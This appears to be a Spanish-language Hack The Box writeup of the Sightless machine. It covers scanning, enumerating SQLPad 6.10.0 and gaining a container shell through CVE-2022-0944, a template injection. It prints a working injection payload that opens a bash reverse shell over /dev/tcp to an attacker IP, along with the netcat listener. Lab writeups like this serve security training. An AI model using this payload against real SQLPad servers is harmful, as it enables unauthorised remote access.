![imagen](https://github.com/user-attachments/assets/3199941f-a364-493b-855c-474481ba6cf5)---
description: >-
  Writeup de la máquina de dificultad fácil Sightless de la página https://hackthebox.eu
title: Hack The Box - Sightless | (Difficulty Easy) - Linux
date: 2025-01-16
categories: [Hack the Box, Writeup]
tags: [htb, hacking, hack the box, linux, easy, writeup, redteam, pentesting]
image_post: true
image: https://github.com/user-attachments/assets/3369b1c5-339a-4c19-abb3-aa5b8226b4ea
---

## Useful Skills

* Web enumeration
* Abusing Template Injection to RCE (SQLPad 6.10.0 - CVE-2022-0944) [Gain access]
* 

## Enumeration

### TCP Scan

 ```bash
rustscan -a 10.10.11.32 --ulimit 5000 -g
10.10.11.32 -> [21,22,80]
```

```bash
nmap -p22,21,80 -sCV 10.10.11.32 -oN tcpScan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-16 15:10 CET
Nmap scan report for 10.10.11.32
Host is up (0.036s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
|_  256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://sightless.htb/
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.94SVN%I=7%D=1/16%Time=67891346%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,A0,"220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20FTP\x20
SF:Server\)\x20\[::ffff:10\.10\.11\.32\]\r\n500\x20Invalid\x20command:\x20
SF:try\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\x
SF:20being\x20more\x20creative\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.07 seconds
```

### UDP Scan

 ```bash
nmap -sU --top-ports 1500 --min-rate 5000 -n -Pn 10.10.11.32 -oN udpScan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-16 15:13 CET
Nmap scan report for 10.10.11.32
Host is up (0.038s latency).
Not shown: 1494 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
17146/udp closed unknown
17494/udp closed unknown
27682/udp closed unknown
36384/udp closed unknown
44334/udp closed unknown
49207/udp closed unknown
```

### FTP Enumeration

En el puerto 21/TCP observo un servidor ProFTPD asociado a un nombre de dominio llamado sightless.htb. Por otra parte no se puede visualizar en el escaneo la versión y no se detecta anonymous login

> Hay que añadir el dominio sightless.htb en el archivo de configuración /etc/hosts para que se puede resolver el nombre de dominio a la dirección IP 10.10.11.32
{: .prompt-tip }

### HTTP Enumeration

Whatweb reporta que se produce una redirección desde http://10.10.11.32 a http://sightless.htb/, un email el cual es sales@sightless.htb y un servidor Nginx 1.18.0

```bash
whatweb http://10.10.11.32
http://10.10.11.32 [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.32], RedirectLocation[http://sightless.htb/], Title[302 Found], nginx[1.18.0]
http://sightless.htb/ [200 OK] Country[RESERVED][ZZ], Email[sales@sightless.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.32], Title[Sightless.htb], X-UA-Compatible[IE=edge], nginx[1.18.0]
```

Accediendo a la página en http://sightless.htb/ se puede observar una web de una empresa que se dedidca a la gestión de bases de datos y servidores.

![imagen](https://github.com/user-attachments/assets/0bbc6ad5-d426-4d78-8882-91bf492d9e93)

En la sección services de la página web puedo observar diferentes servicios, son tres servicios:

* SQLPad: Es una aplicación web que permite a los usuarios conectarse a varios servidores SQL a través de un navegador.
* Froxlor: Es un Panel de control de servidores multilenguaje, con una interfaz gráfica web que permite administrar, entre otros, los servicios de correo electrónico, dominios y FTP.
* Database & Server Management: Gestión de bases de datos y sistemas.

![imagen](https://github.com/user-attachments/assets/e8b9c0a5-e01c-449e-a4c9-a01e71dbba80)

> Puede que se esté utilizando Froxlor para administrir el servidor FTP que se ha detectado en el escaneo de puertos
{: .prompt-info }

Intento acceder al primer servicio, obtengo un error del navegador el cual me indica que no se puede conectar a sqlpad.sightless.htb

![imagen](https://github.com/user-attachments/assets/9062ad9d-f74c-461f-b9e4-5fc531820fde)

> Hay que añadir el dominio sqlpad.sightless.htb en el archivo de configuración /etc/hosts para que se puede resolver el nombre de dominio a la dirección IP 10.10.11.32
{: .prompt-tip }

Intento acceder nuevamente a http://sqlpad.sightless.htb, la primera visión que obtengo es la aplicación gráfica SQLPad la cual permite conectarse a diferentes servidores SQL

![imagen](https://github.com/user-attachments/assets/7985ef2f-d2d6-4cef-8ead-23ca92e06703)

En la parte superior derecha observo tres puntos al hacer clic sobre los mismos puedo ver una opción About, al acceder la misma puedo descubrir la versión de SQLPad, la cual es 6.10.0

![imagen](https://github.com/user-attachments/assets/d6d8f19e-024a-425b-b28a-2cc26f6997eb)

![imagen](https://github.com/user-attachments/assets/cd4608e6-21df-494a-9870-d5fcc254d1b9)

> Sabiendo que es SQLPad y que la versión es 6.10.0 puedo buscar información sobre posibles vulnerabilidades existentes
{: .prompt-info }

## Vulnerability analysis

### CVE-2022-0944 (SQLPad Remote Command Execution)

Una pequeña búsqueda en internet me permite dar con la vulnerabilidad CVE-2022-0944, se trata de una vulnerabilidad que permite la ejecución remota de código a través una template injection en el endpoint /api/test-connectionendpoint

* [NVD Explanation CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

## Exploitation

### Abusing SQLPad RCE Vulnerability (CVE-2022-0944)

En huntr encuentro un post sobre la vulnerabilidad CVE-2022-0944 el cual me sirven de guía para realizar la explotación de forma manual y entender como funciona todo.

* [Template injection in connection test endpoint leads to RCE in sqlpad/sqlpad](https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb)

![imagen](https://github.com/user-attachments/assets/d13e1b2f-7fd7-44a0-96cb-0af165a8ed49)

El primer paso es acceder a connections y añadir una nueva conexión

![imagen](https://github.com/user-attachments/assets/50020b32-c3e5-4479-b554-292d502a6aa3)

![imagen](https://github.com/user-attachments/assets/7ccc4636-ab54-46a5-a53c-b8c20053c1ca)

Selecciono MySQL como Driver

![imagen](https://github.com/user-attachments/assets/9d039b44-3b7d-4a06-9139-f9e7a8f29eb5)

Inicio un listener con netcat por el puerto 4444 para obtener la reverse shell al ejecutar la inyección

```bash
nc -lvnp 4444
listening on [any] 4444 .
```

En el campo Database introduzco el payload que contiene la inyección acomodada para enviar una reverse shell hacia mi máquina de atacante

> Payload: {{ process.mainModule.require('child_process').exec('/bin/bash -c "bash -i >& /dev/tcp/10.10.14.160/4444 0>&1"') }}
{: .prompt-info }

![imagen](https://github.com/user-attachments/assets/1f6803ec-b88d-4908-a167-8e2e991b41a0)

Por ultimo hago clic sobre Test y obtengo la reverse shell a lo que parece ser un contenedor, ya que la IP victima es la 10.10.11.32 y me encuentro en la 172.17.0.2

![imagen](https://github.com/user-attachments/assets/d3a1df29-b740-4234-91ac-243e50530d1d)

```bash
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.160] from (UNKNOWN) [10.10.11.32] 47918
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@c184118df0a6:/var/lib/sqlpad# hostname -I
172.17.0.2
```
